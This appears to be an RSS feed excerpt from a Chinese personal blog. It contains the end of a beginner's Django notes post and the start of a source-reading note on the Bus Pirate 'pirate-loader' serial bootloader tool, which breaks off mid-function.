框架的 结构。model， template，view。这几个文件的功能如上面所描述的一样， 数据库交互， 页面渲染， 请求响应。</p><h4 id="Nginx-关系？"><a href="#Nginx-关系？" class="headerlink" title="Nginx 关系？"></a>Nginx 关系？</h4><blockquote><p><strong>Nginx</strong>（发音同engine x）是一个异步框架的 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUI2JUIyJUU5JUEwJTgxJUU0JUJDJUJBJUU2JTlDJThEJUU1JTk5JUE4" title="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%A0%81%E4%BC%BA%E6%9C%8D%E5%99%A8">Web服务器<i class="fa fa-external-link"></i></span>，也可以用作<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JThGJThEJUU1JTkwJTkxJUU0JUJCJUEzJUU3JTkwJTg2" title="https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理<i class="fa fa-external-link"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUI0JTlGJUU4JUJEJUJEJUU1JTlEJTg3JUU4JUExJUEx" title="https://zh.wikipedia.org/wiki/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">负载平衡器<i class="fa fa-external-link"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyVCQyU5MyVFNSVBRCU5OA==" title="https://zh.wikipedia.org/wiki/HTTP%E7%BC%93%E5%AD%98">HTTP缓存<i class="fa fa-external-link"></i></span>。该软件由 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJThBJUU2JTg4JTg4JUU3JTg4JUJFJUMyJUI3JUU4JUIzJUJEJUU3JUI0JUEyJUU4JTgwJUI2JUU1JUE0JUFC" title="https://zh.wikipedia.org/wiki/%E4%BC%8A%E6%88%88%E7%88%BE%C2%B7%E8%B3%BD%E7%B4%A2%E8%80%B6%E5%A4%AB">Igor Sysoev<i class="fa fa-external-link"></i></span>创建，并于2004年首次公开发布。<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvTmdpbngjY2l0ZV9ub3RlLU1vYmlseS02" title="https://zh.wikipedia.org/wiki/Nginx#cite_note-Mobily-6">[6]<i class="fa fa-external-link"></i></span> 同名公司成立于2011年，以提供支持。<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvTmdpbngjY2l0ZV9ub3RlLUQtNw==" title="https://zh.wikipedia.org/wiki/Nginx#cite_note-D-7">[7]<i class="fa fa-external-link"></i></span> </p><p>一个web服务器面对的是外部世界。它能直接从文件系统提供文件 (HTML, 图像， CSS等等)。然而，它无法 <strong>直接</strong> 与Django应用通信；它需要借助<strong>一些工具</strong>的帮助，这些东西会运行运用，接收来自web客户端（例如浏览器）的请求，然后返回响应。</p><p><strong>一个Web服务器网关接口（Web Server Gateway Interface） - WSGI - 就是干这活的。 <span class="exturl" data-url="aHR0cDovL3dzZ2kub3JnLw==" title="http://wsgi.org/">WSGI<i class="fa fa-external-link"></i></span> 是一种Python标准。</strong> </p></blockquote><p>WebServer 也就是 WEB 服务器。前面有说过，这个是是作为内容分发者，其自动的动态的数据请求和静态的资源请求，这些东西，分发到不同的部分进行 运行，静态内容由服务器自己获取。剩下的动态东西，就交给了WSGI 这东西，执行 Py 的内容，运行后得到结果。</p><p>我们完整的组件栈看起来将是这样的: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the web client &lt;-&gt; the web server &lt;-&gt; the socket &lt;-&gt; uwsgi &lt;-&gt; Django</span><br></pre></td></tr></table></figure><p>这里的 server 通过 socket 与 uwsgi 进行进程间的同学，是的，其可以很好的执行该执行的脚本。且返回结果</p><hr><p>在这里使用 Django 进行 开发的时候，实际上只是个 <code>manager runserver</code> 命令，就可以跑起来一个页面了对吧？</p><p>实际上，这样滴的确已经成功的构建了web 服务。 而且可以实现基本所有的正常功能了。</p><p>那么 nginx 的作用？ 当然是更专业的提供一个更强的性能保证。</p><blockquote><p>内容部分引用自 <span class="exturl" data-url="aHR0cDovL3V3c2dpLWRvY3MtemgucmVhZHRoZWRvY3MuaW8vemhfQ04vbGF0ZXN0L3R1dG9yaWFscy9EamFuZ29fYW5kX25naW54Lmh0bWwjaWQz" title="http://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/tutorials/Django_and_nginx.html#id3">uWSGI - manual - zh<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="第一个工程"><a href="#第一个工程" class="headerlink" title="第一个工程"></a>第一个工程</h4><p>这里是使用的 PyCharm 这个IDE 新建的 工程了，工程以及模板，差不多是一键生成的状态。目录树的结构差不多如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld/</span><br><span class="line">|-- HelloWorld</span><br><span class="line">|   |-- __init__.py</span><br><span class="line">|   |-- settings.py</span><br><span class="line">|   |-- urls.py</span><br><span class="line">|   |-- view.py</span><br><span class="line">|   `-- wsgi.py</span><br><span class="line">|-- manage.py</span><br><span class="line">`-- templates</span><br><span class="line">    `-- hello.html、</span><br></pre></td></tr></table></figure><p>直接执行 <code>manage.py runserver 8000</code> 就可以很方便的在 本机的 8000 跑起了web 的服务了 。</p><h4 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h4><p>原有的 实例工程已经给我们配置好了基本的所需， 这里的是这些文件的基本配置。</p><p>在 <strong>url.py</strong> 这个文件中的是，这个工程的路由配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from helloworld import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&apos;^index$&apos;, views.index),</span><br><span class="line">    url(r&apos;^get_data$&apos;, views.get_data),</span><br><span class="line">    url(r&apos;test$&apos;, views.test)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里的 index ，get_data， test ，就是 代表着不同的路由。实际上，我们可以理解成：对我们访问的 URL 进行解析的方式。</p><p>前面的是 路由路径， 后面的是这个 路由路径所对应的视图 其函数定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def url(regex, view, kwargs=None, name=None):</span><br></pre></td></tr></table></figure><blockquote><p>在 Django 中，网页和其他内容都是从视图派生而来。每一个视图表现为一个简单的 Python 函数（ </p></blockquote><hr><p>这里用到了通配符，这个自己只是了解，具体的 有些还是记不清的，这里总结一下：</p><ul><li><p>^ $          这里的两个符号，前者代表匹配开头， 后者代表匹配的结束</p><p>   .         匹配除了换行之外的 任何符号一次</p><p>   *         多次匹配， 代表<strong>多次</strong>任意字符</p><p>   []        这里的方括号内容，就是知己手动指定的匹配范围</p><pre><code>例如 [xyz]  \[c-f] \[0-9] </code></pre><p>   ?        单次匹配一个<strong>或者0</strong>个字符</p><p>   +         和<em> 类似多次匹配任意字符， 但是 <em>*不匹配0个</em></em></p></li></ul><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80OWQ1ZWU0NmRlNDc=" title="https://www.jianshu.com/p/49d5ee46de47">shell中的正则表达式和通配符 - Fengya<i class="fa fa-external-link"></i></span></p></blockquote><h4 id="视图配置"><a href="#视图配置" class="headerlink" title="视图配置"></a>视图配置</h4><p>在 django里面  ，视图实际上就是一个函数</p><p>这里的就是 我们的第一个hello 所对应的视图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(req)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render(req, <span class="string">'./demo.html'</span>)</span><br></pre></td></tr></table></figure><p>这里的一个 render 函数，也就是渲染器。把我们本地的 html 进行渲染之后，就可以返回到前端。</p><p>这样我们就可以看到了我们的页面。</p><p>看 render 函数的定义 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render</span><span class="params">(request, template_name, context=None, content_type=None, status=None, using=None)</span>:</span></span><br></pre></td></tr></table></figure><p>后面是有缺省参数的， 这里的 context ，我们可以在 <strong>html文件</strong> 里面加入变量。（当然这个不是 html 的标准语法，是django的）类似于这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; hello &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样在我们的页面中就存在了一个参数。 这样我可以指定我们的 渲染参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context = &#123;</span><br><span class="line">    &quot;hello&quot;: &apos;hahaha&apos;</span><br><span class="line">&#125;</span><br><span class="line">return render(req, &apos;./demo.html&apos;, context)</span><br></pre></td></tr></table></figure><p>然后进行网站访问之后， 可以 f12 看到：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hahaha<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>当然，这里的视图函数不一定，不许是个html 的页面， 我们可以基础的发过去一个请求或者一段文字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> http.HttpResponse(<span class="string">"rayd"</span>)</span><br></pre></td></tr></table></figure><p>或者 json 内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> http.HttpResponse(json.dumps(data), content_type=<span class="string">"application/json"</span>)</span><br></pre></td></tr></table></figure><h4 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h4><p>再回到之前的 目录结构。因为之前不了解这个问题，所以导致了页面的的很多元素是无法找到的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld/</span><br><span class="line">|-- HelloWorld</span><br><span class="line">|   |-- __init__.py</span><br><span class="line">|   |-- settings.py</span><br><span class="line">|   |-- urls.py</span><br><span class="line">|   |-- view.py</span><br><span class="line">|   `-- wsgi.py</span><br><span class="line">|-- manage.py</span><br><span class="line">|-- static</span><br><span class="line">||-- css</span><br><span class="line">|`-- js</span><br><span class="line">`-- templates</span><br><span class="line">    `-- hello.html、</span><br></pre></td></tr></table></figure><p>在之前的目录结构的基础上这里发生了一些小小的变化。</p><p>添加了一个 static的文件夹,什么是静态文件：这里是标准的定义</p><blockquote><p>静态文件是指 网站中的 js, css, 图片，视频等文件</p></blockquote><hr><p>所以，在先前的模板文件中的，静态文件的引用位置是需要发生改变 的。</p><p>这里是原文件中的引用位置:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Bootstrap core CSS--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"vendor/bootstrap/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom fonts for this template--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"vendor/font-awesome/css/font-awesome.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Page level plugin CSS--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"vendor/datatables/dataTables.bootstrap4.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom styles for this template--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"css/sb-admin.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong> /* 指的是相对根 ， * 指的是相对当前文件</p><p>在 Django 的框架中，其指定了静态文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, <span class="string">'static'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>所以我们的 引用目录变成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Bootstrap Core CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/static/vendor/bootstrap/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- MetisMenu CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/static/vendor/metisMenu/metisMenu.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/static/dist/css/sb-admin-2.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Morris Charts CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/static/vendor/morrisjs/morris.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom Fonts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/static/vendor/font-awesome/css/font-awesome.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="请求响应"><a href="#请求响应" class="headerlink" title="请求响应"></a>请求响应</h4><p>在视图函数中，可以很容易的 ，进行对于不同请求的响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def get_data(req):</span><br><span class="line">    req.encoding = &apos;utf-8&apos;</span><br><span class="line">    if req.GET:</span><br><span class="line">pass</span><br><span class="line">if req.POST:</span><br><span class="line">pass</span><br><span class="line"># ...</span><br></pre></td></tr></table></figure><h4 id="前后端的数据交互"><a href="#前后端的数据交互" class="headerlink" title="前后端的数据交互"></a>前后端的数据交互</h4><p>既然是WEB 开发， 这里的东西就是重要到不能再重要的 地方了。 </p><blockquote><p><strong>前端</strong>（英语：<strong>front-end</strong>）和<strong>后端</strong>（英语：<strong>back-end</strong>）是描述进程开始和结束的通用词汇。前端作用于采集输入信息，后端进行处理。计算机程序的<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JTk1JThDJUU5JTlEJUEy" title="https://zh.wikipedia.org/wiki/%E7%95%8C%E9%9D%A2">界面<i class="fa fa-external-link"></i></span>样式，视觉呈现属于前端。 </p></blockquote><p>用户看见的，既是前端， 数据来的地方就是后端。</p><hr><p>关于 前后端的数据交互这里有篇很好的文章，也是同学发来的，作为收藏。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FmZ2czL2FydGljbGUvZGV0YWlscy81MTc4MDc2MA==" title="https://blog.csdn.net/qfgg3/article/details/51780760">前后端数据交互方法<i class="fa fa-external-link"></i></span></p></blockquote><p>这里的应用主要是应用了 AJAX ，在前端发起的异步请求，以获得后端的 json数据。</p><p>后端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> http.HttpResponse(<span class="string">"heko"</span>)</span><br></pre></td></tr></table></figure><p>前端代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id=<span class="string">"btn_add"</span> type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span> onclick=hello()&gt;</span><br><span class="line">    &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"glyphicon glyphicon-plus"</span> aria-hidden=<span class="string">"true"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>新增</span><br><span class="line">&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">var hello = function () &#123;</span></span><br><span class="line"><span class="regexp">    alert("hello");</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    var data = $.ajax(&#123;url:"/</span>test<span class="string">", async:false&#125;);</span></span><br><span class="line"><span class="string">    alert(data.responseText)</span></span><br><span class="line"><span class="string">    // 这里后面就可以实现对html页面进行改变</span></span><br><span class="line"><span class="string">    // 比如，指定 元素的ID</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure><p>这样就可以实现 前后端 的数据通信。当然，对于 ajax 的请求。是可以向后台传递参数的。后台对我们的参数进行响应和解析</p><h4 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h4><p>这里虽然目前还是没有用上，不过想看看，学习一下了，以后上线之后 向 nginx 搬移是必经 的。</p><ul><li><a href="#Nginx 关系？">WSGI是什么</a></li></ul><p>这里先贴出教程的链接了</p><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5ydW5vb2IuY29tL2RqYW5nby9kamFuZ28tbmdpbngtdXdzZ2kuaHRtbA==" title="http://www.runoob.com/django/django-nginx-uwsgi.html">Django Nginx+uwsgi 安装配置<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3V3c2dpLWRvY3MtemgucmVhZHRoZWRvY3MuaW8vemhfQ04vbGF0ZXN0L3R1dG9yaWFscy9EamFuZ29fYW5kX25naW54Lmh0bWwjaWQz" title="http://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/tutorials/Django_and_nginx.html#id3">uWSGI - manual - zh<i class="fa fa-external-link"></i></span></li></ul><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>很高兴，能有人看到这段话。没有因为内容的索然无味，直接close 掉。</p><p>是作为自己的笔记了，因为的确，对于 web 的接触比较少。所以可以算是从零开始了。</p><p>记载着自己的一些 感想和思路，和比较重要的点。</p><p><strong>勤能补拙</strong></p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/08/10/web_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HackWare Loader PC工作</title>
      <link>https://www.diglp.xyz/2018/06/25/HackWare_PC_loader/</link>
      <guid>https://www.diglp.xyz/2018/06/25/HackWare_PC_loader/</guid>
      <pubDate>Sun, 24 Jun 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;前面的博文，差不多对 BP 所使用的 BL 做了个十分粗浅的理解了， 这一篇， 是对于其PC端上的和BootLoader
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>前面的博文，差不多对 BP 所使用的 BL 做了个十分粗浅的理解了， 这一篇， 是对于其PC端上的和BootLoader 共同作用的一个软件（Pirate-loader）的一个源码的阅读笔记。对其原理进行学习。</p><hr><p>文件定位 ：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0J1c1BpcmF0ZS9CdXNfUGlyYXRlL2Jsb2IvbWFzdGVyL0Jvb3Rsb2FkZXJzL0JQdjMtYm9vdGxvYWRlci9waXJhdGUtbG9hZGVyL3BpcmF0ZS1sb2FkZXIuYw==" title="https://github.com/BusPirate/Bus_Pirate/blob/master/Bootloaders/BPv3-bootloader/pirate-loader/pirate-loader.c">Bootloaders/pirate-loader/pirate-loader.c<i class="fa fa-external-link"></i></span></p><h2 id="源码-Src"><a href="#源码-Src" class="headerlink" title="源码 Src"></a>源码 Src</h2><h3 id="系统条件编译宏"><a href="#系统条件编译宏" class="headerlink" title="系统条件编译宏"></a>系统条件编译宏</h3><p>这个标题可能是不大准确，实现的是我们很长用的功能，我们使用 GCC 编译器的时候， 在不同的平台编译，使用平台的特定系统API，实现功能相同的底层函数。（linux下的就是linuxC，Win下的就是Winapi）。</p><p>下面就是实现的预编译语句，在win下的编译过程中，编译器会自动的帮我们定义了 WIN32 这个宏。</p><pre><code>#ifdef WIN32    #include &lt;windows.h&gt;    #include &lt;time.h&gt;    #define O_NOCTTY 0    #define O_NDELAY 0    #define B115200 115200    #define OS WINDOWS    ...#else    // unix/linux    #include &lt;unistd.h&gt;    #include &lt;termios.h&gt;    #include &lt;sys/select.h&gt;    #include &lt;sys/types.h&gt;    #include &lt;sys/time.h&gt;#endif#if !defined OS    #define OS UNKNOWN#endif</code></pre><h3 id="Win的函数封装"><a href="#Win的函数封装" class="headerlink" title="Win的函数封装"></a>Win的函数封装</h3><p>在这种多平台编译的情况下，统一接口就是比较重要的过程了，在这个工程里，原作者使用win函数进行进一步封装，实现和 Linux 环境下的统一的接口，在后面的功能代码里面直接进行调用即可，这是个很好的思想，学习了</p><hr><p>例如这里是，一个写函数的实现，</p><pre><code>int write(int fd, const void* buf, int len)    {        HANDLE hCom = (HANDLE)fd;    // 这里的文件描述符实际上是句柄了        int res = 0;        unsigned long bwritten = 0;        res = WriteFile(hCom, buf, len, &amp;bwritten, NULL);        if( res == FALSE ) {            return -1;        } else {            return bwritten;            // 已写入字节        }    }</code></pre><p>我们直接使用 <code>man 2 write</code> # 查看系统接口,可以看到，这个write函数的定义原型prototype：</p><pre><code>size_t    write(int fildes, const void *buf, size_t nbyte);</code></pre><p>显然上面的定义是进行了相同的封装。</p><pre><code>int read(int fd, void* buf, int len){    ...     // 和write类似}int close(int fd){    HANDLE hCom = (HANDLE)fd;    CloseHandle(hCom);        // 关闭句柄    return 0;}</code></pre><p>再下面的，这个open就是比较重要的一个函数了。具体的实现过程：</p><pre><code>int open(const char* path, unsigned long flags){    static char full_path[32] = {0};    // buf溢出风险    HANDLE hCom = NULL;    // 这里很是眼熟    if( path[0] != &apos;\\&apos; ) {        _snprintf(full_path, sizeof(full_path) - 1, &quot;\\\\.\\%s&quot;, path);        path = full_path;    }    // 这里是打开串口的操作，后面的参数，OPEN_EXISTING, 说明了存在就打开    // 打开之后，返回我们的串口句柄    hCom = CreateFileA(path, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);    if( !hCom || hCom == INVALID_HANDLE_VALUE ) {        return -1;    } else {        return (int)hCom;    }}</code></pre><p>实际上查看了相关的文章发现， 在win里面进行串口的打开实际上只是需要一个 ‘COMX’ 的端口号就是可以直接试一下 CreateFile 对串口进行打开。</p><p>不过这样前面的 <code>_snprintf</code> 的用法就是显得很迷了？为什么。突然一看后面， 有些眼熟 <code>\\.\COMx</code> 这个格式十分像之前的 win里面进程间通信的有名管道的用法。没错的。</p><hr><p>也找到了这个写法的真正原因：</p><p>如果我们使用过 SMB 的服务，我们会发现在，进行计算机链接的时候我们的键入内容是？</p><pre><code>\\192.168.x.x</code></pre><p>这样就是表面了对远程主机是发起了连接。转回到这里<br>    \.\COMx<br>说明了什么？ 连接到 <code>.</code> 主机（也就是本地主机）的COMx， 妙哉。</p><hr><p><strong>轮询</strong></p><pre><code>int __stdcall select(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfs, const struct timeval* timeout){        // 当前时间加上轮询时间    time_t maxtc = time(0) + (timeout-&gt;tv_sec);    COMSTAT cs = {0};    unsigned long dwErrors = 0;    if( readfds-&gt;fd_count != 1 ) {        return -1;    }    // 条件判断，在轮询时间内进行串口轮询    while( time(0) &lt;= maxtc )    { //only one file supported        if( ClearCommError( (HANDLE)readfds-&gt;fd_array[0], 0, &amp;cs) != TRUE ){            // 失败就是直接返回            return -1;        }        if( cs.cbInQue &gt; 0 ) {            // 成功这里就返回            return 1;        }        Sleep(10);    }    return 0;}</code></pre><hr><p>Select 函数，在linux 下实现的是一个 I/O的复用，准确说是时分复用，这样相当于是给了内核任务，去查看IO的状态。这样就实现了重要的一点， 就是非阻塞IO。所以在Select的精妙的作用下， 可以实现在单线程里面，实现多个IO。</p><p>具体的使用，是根据其返回值，判断当前IO的状态，然后我们可以遍历 描述符集合。</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbmdmZW5ndGVuZ2ZlaS9hcnRpY2xlL2RldGFpbHMvMTIzOTI0NDk=" title="https://blog.csdn.net/lingfengtengfei/article/details/12392449">Linux 下的Select函数<i class="fa fa-external-link"></i></span></li></ul><hr><p>关于 __stdcall 的调用规则修饰，这里再加强记忆一下。</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYV94aWFveGluL2FydGljbGUvZGV0YWlscy8yODY4MjE2" title="https://blog.csdn.net/jia_xiaoxin/article/details/2868216">函数的调用规则(<strong>cdecl,</strong>stdcall,<strong>fastcall,</strong>pascal)<i class="fa fa-external-link"></i></span></li></ul><p>这种调用规则，是从右到左的参数压入顺序，被调用者把参数弹出栈， 用在winapi 里面是比较多的。其函数输出符号是 <code>_func@12</code> 后面是参数的字节数。</p><h3 id="IO函数-封装"><a href="#IO函数-封装" class="headerlink" title="IO函数 封装"></a>IO函数 封装</h3><p>上面的部分已经实现了对 Win和l下的接口的统一封装。</p><p>这一步是对一些IO细节的封装，以便适应我们的应用。</p><hr><p><strong>读函数</strong><br>由其定义名称得知，是带有IO超时的读函数。</p><pre><code>int readWithTimeout(int fd, uint8* out, int length, int timeout){    fd_set fds;    // 这里是select使用的结构    struct timeval tv = {timeout, 0};    int res = -1;    int got = 0;    do {        // 这里是对 文件描述符的集合进行刷新            // 在select 里面会有关闭        FD_ZERO(&amp;fds);        FD_SET(fd, &amp;fds);        res = select(fd + 1, &amp;fds, NULL, NULL, &amp;tv);        if( res &gt; 0 ) {            // 说明IO就绪            res = read(fd, out, length);            if( res &gt; 0 ) {                length -= res;                got    += res;                out    += res;            } else {                break;            }        } else {             return res;        }    } while( length &gt; 0);    // 这里是读到缓冲区长度    // 感觉有问题，这个可以超出out的长度    return got;}</code></pre><p>该函数，实现了对串口状态的非阻塞轮询读，在串口可读时，就多次读取串口数据，进入缓冲区。不可读时，就进行返回。</p><p>这里的问题是，在缓冲区将满的时候，还是存在一个读操作，虽说只是读length个长度，这个长度也是在不断减少，这样讲，好像没什么问题了。</p><hr><p>这个也算是个对底层IO的封装了吧。发送命令等待回应，这个函数调用了上面的读函数。</p><pre><code>int sendCommandAndWaitForResponse(int fd, uint8 *command){    // 读取返回的状态字    uint8  response[4] = {0};    int    res = 0;    // 很正常的写操作    // 这里的长度值得分享    res = write(fd, command, HEADER_LENGTH + command[LENGTH_OFFSET]);    /fail    if( res &lt;= 0 ) {        